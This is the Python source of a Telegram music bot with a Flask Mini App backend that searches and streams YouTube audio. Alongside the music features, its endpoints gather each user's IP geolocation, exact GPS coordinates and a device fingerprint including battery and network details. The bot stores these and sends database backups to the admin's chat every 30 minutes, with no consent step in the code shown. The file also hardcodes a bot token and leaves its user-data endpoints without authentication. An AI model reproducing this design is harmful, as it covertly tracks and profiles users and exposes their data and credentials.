import os
import sqlite3
import threading
import json
import hashlib
import requests as http_requests
from datetime import datetime, timedelta
from functools import lru_cache
from typing import Dict, Optional, Tuple, List
from collections import deque
import glob

import yt_dlp
from flask import Flask, send_from_directory, request, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)

# ==================== КОНФИГ ====================
TOKEN = os.environ.get("BOT_TOKEN", "8410866218:AAFwRJj2RbRuEAMJayfAYnpAOMMdEKdpA_A")
ADMIN_USERNAME = os.environ.get("ADMIN_USERNAME", "okey2010").lower().replace("@", "")
ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", "7889817936"))
APP_URL = os.environ.get("APP_URL", "https://telegram-music-bot-a9vg.onrender.com")

QUALITIES = {'128': '128k', '192': '192k', '320': '320k'}
DEFAULT_QUALITY = '192'

user_queues: Dict[int, deque] = {}
user_processing: Dict[int, bool] = {}

# ==================== БД ====================
DB_PATH = 'music_bot.db'
BACKUP_DIR = 'backups'

def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        chat_id INTEGER PRIMARY KEY,
        username TEXT,
        first_name TEXT,
        last_name TEXT,
        language_code TEXT,
        is_premium BOOLEAN DEFAULT 0,
        registered_at TIMESTAMP,
        last_active TIMESTAMP,
        last_ip TEXT,
        country TEXT,
        city TEXT,
        region TEXT,
        timezone TEXT,
        latitude REAL,
        longitude REAL,
        gps_latitude REAL,
        gps_longitude REAL,
        gps_accuracy INTEGER,
        gps_provided_at TIMESTAMP,
        user_agent TEXT,
        device_type TEXT,
        device_brand TEXT,
        device_model TEXT,
        os_name TEXT,
        os_version TEXT,
        browser_name TEXT,
        browser_version TEXT,
        screen_width INTEGER,
        screen_height INTEGER,
        screen_color_depth INTEGER,
        device_pixel_ratio REAL,
        hardware_concurrency INTEGER,
        max_touch_points INTEGER,
        touch_support BOOLEAN,
        network_type TEXT,
        battery_level INTEGER,
        is_charging BOOLEAN,
        total_requests INTEGER DEFAULT 0,
        total_downloads INTEGER DEFAULT 0,
        total_likes INTEGER DEFAULT 0,
        total_playlists INTEGER DEFAULT 0,
        quality TEXT DEFAULT '192',
        referral_code TEXT
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_likes (
        telegram_id INTEGER,
        track_id TEXT,
        track_title TEXT,
        track_artist TEXT,
        track_url TEXT,
        liked_at TIMESTAMP,
        PRIMARY KEY (telegram_id, track_id)
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS playlists (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        telegram_id INTEGER,
        name TEXT,
        created_at TIMESTAMP
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS playlist_tracks (
        playlist_id INTEGER,
        track_id TEXT,
        track_title TEXT,
        track_artist TEXT,
        track_url TEXT,
        added_at TIMESTAMP,
        position INTEGER,
        PRIMARY KEY (playlist_id, track_id)
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_actions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        action_type TEXT,
        action_data TEXT,
        created_at TIMESTAMP
    )''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        chat_id INTEGER,
        session_id TEXT,
        login_time TIMESTAMP,
        ip_address TEXT,
        location_city TEXT,
        location_country TEXT
    )''')
    
    c.execute('CREATE INDEX IF NOT EXISTS idx_users_chat_id ON users(chat_id)')
    c.execute('CREATE INDEX IF NOT EXISTS idx_likes_telegram_id ON user_likes(telegram_id)')
    c.execute('CREATE INDEX IF NOT EXISTS idx_playlists_telegram_id ON playlists(telegram_id)')
    
    conn.commit()
    conn.close()
    
    # Создаём папку для бэкапов
    if not os.path.exists(BACKUP_DIR):
        os.makedirs(BACKUP_DIR)

def execute_query(query, params=(), fetch_one=False, fetch_all=False):
    with sqlite3.connect(DB_PATH) as conn:
        c = conn.cursor()
        c.execute(query, params)
        if fetch_one:
            return c.fetchone()
        if fetch_all:
            return c.fetchall()
        conn.commit()
        return c.lastrowid if query.strip().upper().startswith('INSERT') else None

def add_user(chat_id: int, username: str, first_name: str, last_name: str):
    referral_code = hashlib.md5(f"{chat_id}_{datetime.now()}".encode()).hexdigest()[:8]
    execute_query('''INSERT OR IGNORE INTO users 
        (chat_id, username, first_name, last_name, registered_at, last_active, quality, referral_code)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?)''',
        (chat_id, username or "", first_name or "", last_name or "", datetime.now(), datetime.now(), DEFAULT_QUALITY, referral_code))

def update_user_geo(chat_id: int, ip: str, country: str, city: str, region: str, timezone: str, lat: float, lon: float):
    execute_query('''UPDATE users SET last_ip = ?, country = ?, city = ?, region = ?, timezone = ?, latitude = ?, longitude = ? WHERE chat_id = ?''',
                  (ip, country, city, region, timezone, lat, lon, chat_id))

def update_user_gps(chat_id: int, lat: float, lon: float, accuracy: int):
    execute_query('''UPDATE users SET gps_latitude = ?, gps_longitude = ?, gps_accuracy = ?, gps_provided_at = ? WHERE chat_id = ?''',
                  (lat, lon, accuracy, datetime.now(), chat_id))

def update_user_device(chat_id: int, data: dict):
    execute_query('''UPDATE users SET 
                     user_agent = ?, device_type = ?, device_brand = ?, device_model = ?,
                     os_name = ?, os_version = ?, browser_name = ?, browser_version = ?,
                     screen_width = ?, screen_height = ?, screen_color_depth = ?, device_pixel_ratio = ?,
                     hardware_concurrency = ?, max_touch_points = ?, touch_support = ?,
                     network_type = ?, battery_level = ?, is_charging = ?
                     WHERE chat_id = ?''',
                  (data.get('user_agent'), data.get('device_type'), data.get('device_brand'), data.get('device_model'),
                   data.get('os_name'), data.get('os_version'), data.get('browser_name'), data.get('browser_version'),
                   data.get('screen_width'), data.get('screen_height'), data.get('screen_color_depth'), data.get('device_pixel_ratio'),
                   data.get('hardware_concurrency'), data.get('max_touch_points'), 1 if data.get('touch_support') else 0,
                   data.get('network_type'), data.get('battery_level'), 1 if data.get('is_charging') else 0,
                   chat_id))

def update_activity(chat_id: int, is_download: bool = False):
    if is_download:
        execute_query('''UPDATE users SET last_active = ?, total_requests = total_requests + 1, total_downloads = total_downloads + 1
                         WHERE chat_id = ?''', (datetime.now(), chat_id))
    else:
        execute_query('''UPDATE users SET last_active = ?, total_requests = total_requests + 1
                         WHERE chat_id = ?''', (datetime.now(), chat_id))

def get_user_quality(chat_id: int) -> str:
    r = execute_query("SELECT quality FROM users WHERE chat_id = ?", (chat_id,), fetch_one=True)
    return r[0] if r and r[0] else DEFAULT_QUALITY

def set_user_quality(chat_id: int, quality: str):
    execute_query("UPDATE users SET quality = ? WHERE chat_id = ?", (quality, chat_id))

def add_like(telegram_id: int, track_id: str, title: str, artist: str, url: str):
    execute_query('''INSERT OR REPLACE INTO user_likes (telegram_id, track_id, track_title, track_artist, track_url, liked_at)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (telegram_id, track_id, title, artist, url, datetime.now()))
    execute_query("UPDATE users SET total_likes = total_likes + 1 WHERE chat_id = ?", (telegram_id,))

def remove_like(telegram_id: int, track_id: str):
    execute_query("DELETE FROM user_likes WHERE telegram_id = ? AND track_id = ?", (telegram_id, track_id))
    execute_query("UPDATE users SET total_likes = total_likes - 1 WHERE chat_id = ?", (telegram_id,))

def get_likes(telegram_id: int):
    return execute_query('''SELECT track_id, track_title, track_artist, track_url, liked_at 
                            FROM user_likes WHERE telegram_id = ? ORDER BY liked_at DESC''', (telegram_id,), fetch_all=True) or []

def create_playlist(telegram_id: int, name: str):
    pid = execute_query("INSERT INTO playlists (telegram_id, name, created_at) VALUES (?, ?, ?)",
                        (telegram_id, name, datetime.now()))
    execute_query("UPDATE users SET total_playlists = total_playlists + 1 WHERE chat_id = ?", (telegram_id,))
    return pid

def get_playlists(telegram_id: int):
    return execute_query("SELECT id, name, created_at FROM playlists WHERE telegram_id = ? ORDER BY created_at DESC", 
                         (telegram_id,), fetch_all=True) or []

def add_track_to_playlist(playlist_id: int, track_id: str, title: str, artist: str, url: str):
    pos = execute_query("SELECT COUNT(*) FROM playlist_tracks WHERE playlist_id = ?", (playlist_id,), fetch_one=True)[0]
    execute_query('''INSERT OR REPLACE INTO playlist_tracks 
                     (playlist_id, track_id, track_title, track_artist, track_url, added_at, position)
                     VALUES (?, ?, ?, ?, ?, ?, ?)''',
                  (playlist_id, track_id, title, artist, url, datetime.now(), pos))

def get_playlist_tracks(playlist_id: int):
    return execute_query('''SELECT track_id, track_title, track_artist, track_url, position
                            FROM playlist_tracks WHERE playlist_id = ? ORDER BY position ASC''', (playlist_id,), fetch_all=True) or []

def log_action(chat_id: int, action_type: str, action_data: dict = None):
    execute_query("INSERT INTO user_actions (chat_id, action_type, action_data, created_at) VALUES (?, ?, ?, ?)",
                  (chat_id, action_type, json.dumps(action_data) if action_data else None, datetime.now()))

# ==================== КЭШ АУДИО ====================
@lru_cache(maxsize=100)
def get_cached_audio_url(url: str) -> Optional[str]:
    ydl_opts = {
        'quiet': True,
        'no_warnings': True,
        'format': 'bestaudio',
        'extract_flat': 'in_playlist',
    }
    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=False)
            if info:
                for f in info.get('formats', []):
                    if f.get('acodec') != 'none' and f.get('vcodec') == 'none':
                        return f.get('url')
                return info.get('url')
    except Exception as e:
        print(f"Audio error: {e}")
    return None

# ==================== ВЕБ-СЕРВЕР ====================
web_app = Flask(__name__)

@web_app.route('/')
def serve_index():
    return send_from_directory('.', 'index.html')

@web_app.route('/api/collect_data', methods=['POST'])
def collect_data():
    data = request.json
    telegram_id = data.get('telegram_id')
    if not telegram_id:
        return jsonify({'error': 'No telegram_id'}), 400
    
    ip = request.remote_addr
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    
    country = city = region = timezone = None
    lat = lon = None
    
    try:
        geo_resp = http_requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
        if geo_resp.status_code == 200:
            geo = geo_resp.json()
            if geo.get('status') == 'success':
                country = geo.get('country')
                city = geo.get('city')
                region = geo.get('regionName')
                timezone = geo.get('timezone')
                lat = geo.get('lat')
                lon = geo.get('lon')
    except:
        pass
    
    update_user_geo(telegram_id, ip, country, city, region, timezone, lat, lon)
    update_user_device(telegram_id, data.get('device', {}))
    
    session_id = data.get('session_id')
    if session_id:
        execute_query('''INSERT INTO user_sessions (chat_id, session_id, login_time, ip_address, location_city, location_country)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (telegram_id, session_id, datetime.now(), ip, city, country))
    
    log_action(telegram_id, 'device_data_collected', {'ip': ip, 'country': country})
    return jsonify({'success': True})

@web_app.route('/api/gps_location', methods=['POST'])
def save_gps():
    data = request.json
    telegram_id = data.get('telegram_id')
    lat = data.get('latitude')
    lon = data.get('longitude')
    accuracy = data.get('accuracy', 0)
    if telegram_id and lat and lon:
        update_user_gps(telegram_id, lat, lon, accuracy)
        log_action(telegram_id, 'gps_provided', {'latitude': lat, 'longitude': lon})
        return jsonify({'success': True})
    return jsonify({'error': 'Invalid data'}), 400

@web_app.route('/api/profile/<int:telegram_id>')
def api_profile(telegram_id):
    user = execute_query("SELECT first_name, username, country, city, device_type, os_name, total_requests, total_downloads, quality FROM users WHERE chat_id = ?", 
                         (telegram_id,), fetch_one=True)
    if not user:
        return jsonify({'exists': False})
    
    likes_count = execute_query("SELECT COUNT(*) FROM user_likes WHERE telegram_id = ?", (telegram_id,), fetch_one=True)[0]
    playlists_count = execute_query("SELECT COUNT(*) FROM playlists WHERE telegram_id = ?", (telegram_id,), fetch_one=True)[0]
    
    return jsonify({
        'exists': True,
        'display_name': user[0] or 'User',
        'username': user[1] or '',
        'country': user[2],
        'city': user[3],
        'device_type': user[4],
        'os_name': user[5],
        'total_requests': user[6] or 0,
        'total_downloads': user[7] or 0,
        'quality': user[8] or '192',
        'stats': {'likes': likes_count, 'playlists': playlists_count}
    })

@web_app.route('/api/likes/<int:telegram_id>', methods=['GET', 'POST', 'DELETE'])
def api_likes(telegram_id):
    if request.method == 'GET':
        likes = get_likes(telegram_id)
        return jsonify([{'track_id': l[0], 'title': l[1], 'artist': l[2], 'url': l[3], 'liked_at': l[4]} for l in likes])
    elif request.method == 'POST':
        data = request.json
        add_like(telegram_id, data.get('track_id'), data.get('title'), data.get('artist'), data.get('url'))
        return jsonify({'success': True})
    elif request.method == 'DELETE':
        track_id = request.args.get('track_id')
        if track_id:
            remove_like(telegram_id, track_id)
        return jsonify({'success': True})

@web_app.route('/api/playlists/<int:telegram_id>', methods=['GET', 'POST'])
def api_playlists(telegram_id):
    if request.method == 'GET':
        playlists = get_playlists(telegram_id)
        return jsonify([{'id': p[0], 'name': p[1], 'created_at': p[2]} for p in playlists])
    elif request.method == 'POST':
        data = request.json
        pid = create_playlist(telegram_id, data.get('name'))
        return jsonify({'id': pid, 'success': True})

@web_app.route('/api/playlists/<int:playlist_id>/tracks', methods=['GET', 'POST', 'DELETE'])
def api_playlist_tracks(playlist_id):
    if request.method == 'GET':
        tracks = get_playlist_tracks(playlist_id)
        return jsonify([{'track_id': t[0], 'title': t[1], 'artist': t[2], 'url': t[3], 'position': t[4]} for t in tracks])
    elif request.method == 'POST':
        data = request.json
        add_track_to_playlist(playlist_id, data.get('track_id'), data.get('title'), data.get('artist'), data.get('url'))
        return jsonify({'success': True})
    elif request.method == 'DELETE':
        track_id = request.args.get('track_id')
        if track_id:
            execute_query("DELETE FROM playlist_tracks WHERE playlist_id = ? AND track_id = ?", (playlist_id, track_id))
        return jsonify({'success': True})

@web_app.route('/search')
def api_search():
    query = request.args.get('q', '')
    if not query:
        return jsonify([])
    ydl_opts = {'quiet': True, 'no_warnings': True, 'extract_flat': True, 'default_search': 'ytsearch', 'playlistend': 10}
    try:
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(f"ytsearch10:{query}", download=False)
            results = []
            if info and 'entries' in info:
                for entry in info['entries'][:10]:
                    if entry:
                        results.append({
                            'id': entry.get('id', ''),
                            'title': entry.get('title', 'Без названия')[:70],
                            'artist': entry.get('uploader', 'YouTube'),
                            'duration': entry.get('duration', 0),
                            'url': f"https://youtube.com/watch?v={entry.get('id')}",
                            'thumbnail': entry.get('thumbnail', '')
                        })
            return jsonify(results)
    except:
        return jsonify([])

@web_app.route('/download')
def api_download():
    url = request.args.get('url', '')
    if not url:
        return jsonify({'error': 'No URL'})
    audio_url = get_cached_audio_url(url)
    if audio_url:
        return jsonify({'url': audio_url})
    return jsonify({'error': 'Download failed'})

# ==================== ТЕЛЕГРАМ КОМАНДЫ ====================
async def is_admin(update: Update) -> bool:
    if not ADMIN_USERNAME:
        return False
    user = update.effective_user
    return user.username and user.username.lower() == ADMIN_USERNAME

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.username or "", user.first_name or "", user.last_name or "")
    await update.message.reply_text(
        f"🎵 Привет, {user.first_name}!\n\n"
        "Я музыкальный бот. Просто напиши название песни или исполнителя.\n\n"
        "🔗 *Открой Mini App* для полного функционала!",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[
            InlineKeyboardButton("🎵 Открыть приложение", web_app={"url": APP_URL})
        ]])
    )
    update_activity(user.id)

async def me(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = execute_query("SELECT first_name, username, country, city, device_type, os_name, total_requests, total_downloads, total_likes, total_playlists, quality FROM users WHERE chat_id = ?", 
                         (user_id,), fetch_one=True)
    if not user:
        await update.message.reply_text("❌ Информация не найдена")
        return
    
    likes_count = execute_query("SELECT COUNT(*) FROM user_likes WHERE telegram_id = ?", (user_id,), fetch_one=True)[0]
    playlists_count = execute_query("SELECT COUNT(*) FROM playlists WHERE telegram_id = ?", (user_id,), fetch_one=True)[0]
    
    await update.message.reply_text(
        f"📊 *Ваша статистика*\n\n"
        f"👤 *Имя:* {user[0] or '?'}\n"
        f"🔖 *Username:* @{user[1] or 'нет'}\n"
        f"🌍 *Страна:* {user[2] or 'неизвестно'}\n"
        f"📱 *Устройство:* {user[3] or '?'} / {user[4] or '?'}\n\n"
        f"📈 *Активность:*\n"
        f"• Запросов: {user[5] or 0}\n"
        f"• Скачиваний: {user[6] or 0}\n"
        f"• Лайков: {likes_count}\n"
        f"• Плейлистов: {playlists_count}\n\n"
        f"⚙️ *Качество:* {user[10] or '192'} kbps",
        parse_mode='Markdown'
    )

async def get_db_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        await update.message.reply_text("⛔ Доступ запрещён")
        return
    if os.path.exists(DB_PATH):
        await update.message.reply_document(
            document=open(DB_PATH, 'rb'),
            filename=f'music_bot_backup_{datetime.now().strftime("%Y%m%d_%H%M")}.db',
            caption=f'📊 Бэкап БД от {datetime.now().strftime("%Y-%m-%d %H:%M")}'
        )
    else:
        await update.message.reply_text("❌ Файл БД не найден")

async def restore_db(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        await update.message.reply_text("⛔ Доступ запрещён")
        return
    if not update.message.document:
        await update.message.reply_text("❌ Отправьте файл .db")
        return
    file = await update.message.document.get_file()
    await file.download_to_drive(DB_PATH)
    await update.message.reply_text("✅ БД восстановлена!")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await is_admin(update):
        await update.message.reply_text("⛔ Только для админа")
        return
    
    total_users = execute_query("SELECT COUNT(*) FROM users", fetch_one=True)[0]
    total_requests = execute_query("SELECT SUM(total_requests) FROM users", fetch_one=True)[0] or 0
    total_downloads = execute_query("SELECT SUM(total_downloads) FROM users", fetch_one=True)[0] or 0
    total_likes = execute_query("SELECT COUNT(*) FROM user_likes", fetch_one=True)[0]
    total_playlists = execute_query("SELECT COUNT(*) FROM playlists", fetch_one=True)[0]
    
    await update.message.reply_text(
        f"📊 *Общая статистика*\n\n"
        f"👥 *Пользователей:* {total_users}\n"
        f"🔍 *Поисков:* {total_requests}\n"
        f"🎵 *Скачиваний:* {total_downloads}\n"
        f"❤️ *Лайков:* {total_likes}\n"
        f"📀 *Плейлистов:* {total_playlists}",
        parse_mode='Markdown'
    )

# ==================== АВТОБЭКАП КАЖДЫЕ 30 МИНУТ ====================
def cleanup_old_backups(keep_last=20):
    """Удаляет старые бэкапы, оставляя только последние keep_last штук"""
    try:
        backups = sorted(glob.glob(f"{BACKUP_DIR}/music_bot_*.db"), key=os.path.getctime)
        if len(backups) > keep_last:
            for old_backup in backups[:-keep_last]:
                os.remove(old_backup)
                print(f"🗑️ Удалён старый бэкап: {old_backup}")
    except Exception as e:
        print(f"Ошибка очистки бэкапов: {e}")

async def scheduled_backup(context: ContextTypes.DEFAULT_TYPE):
    """Автоматический бэкап БД каждые 30 минут"""
    if os.path.exists(DB_PATH):
        try:
            # Создаём бэкап в папке backups
            backup_filename = f"{BACKUP_DIR}/music_bot_{datetime.now().strftime('%Y%m%d_%H%M')}.db"
            import shutil
            shutil.copy(DB_PATH, backup_filename)
            print(f"💾 Создан бэкап: {backup_filename}")
            
            # Отправляем в Telegram
            await context.bot.send_document(
                chat_id=ADMIN_CHAT_ID,
                document=open(backup_filename, 'rb'),
                filename=f'music_bot_{datetime.now().strftime("%Y%m%d_%H%M")}.db',
                caption=f'📊 Автобэкап БД от {datetime.now().strftime("%Y-%m-%d %H:%M")}'
            )
            print(f"✅ Бэкап отправлен в Telegram")
            
            # Чистим старые бэкапы (оставляем последние 20)
            cleanup_old_backups(keep_last=20)
            
        except Exception as e:
            print(f"❌ Ошибка бэкапа: {e}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.message.text.strip()
    if not query or query.startswith('/'):
        return
    update_activity(update.effective_user.id)
    await update.message.reply_text(f"🔍 Ищу: {query}\n(открой Mini App для воспроизведения)")

# ==================== ЗАПУСК ====================
def run_web():
    web_app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)), debug=False, use_reloader=False)

def main():
    print("🚀 Запуск бота...")
    threading.Thread(target=run_web, daemon=True).start()
    init_db()
    
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("me", me))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("getdb", get_db_command))
    app.add_handler(CommandHandler("restore", restore_db))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.Document.ALL, restore_db))
    
    # Автобэкап каждые 30 минут
    if app.job_queue:
        app.job_queue.run_repeating(scheduled_backup, interval=1800, first=10)
        print("⏰ Запланирован автобэкап каждые 30 минут (оставляем 20 последних)")
    
    print("✅ Бот запущен!")
    print(f"Команды: /start, /me, /stats, /getdb, /restore")
    app.run_polling()

if __name__ == "__main__":
    main()
